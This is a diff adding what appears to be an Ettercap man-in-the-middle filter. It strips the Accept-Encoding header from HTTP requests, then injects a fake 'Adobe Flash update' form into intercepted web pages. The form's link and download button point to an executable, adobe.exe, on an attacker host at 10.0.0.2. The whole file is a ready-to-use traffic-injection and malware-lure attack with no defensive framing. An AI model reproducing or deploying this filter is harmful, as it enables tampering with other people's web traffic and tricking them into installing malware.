@@ -1,0 +1,24 @@
+if (ip.proto == TCP && tcp.dst == 80) {
+
+if (search(DATA.data, "Accept-Encoding")) {
+
+replace("Accept-Encoding", "Accept-Troonish");
+
+  }
+
+}
+
+ 
+if (ip.proto == TCP && tcp.src == 80) {
+
+if (search(DATA.data, "<title>")) {
+
+replace("</title>", "</title> <form action='http://10.0.0.2/adobe.exe' method='link'><p align='center'><a href='http://10.0.0.2/adobe.exe'> 
+<img src='http://10.0.0.2/get.jpg'> </a><br> New version of Adobe Flash. Please install updates. <br><INPUT TYPE=submit value='Download!'></p>
+</form>");
+
+msg("Form Injected");
+
+  }
+
+}
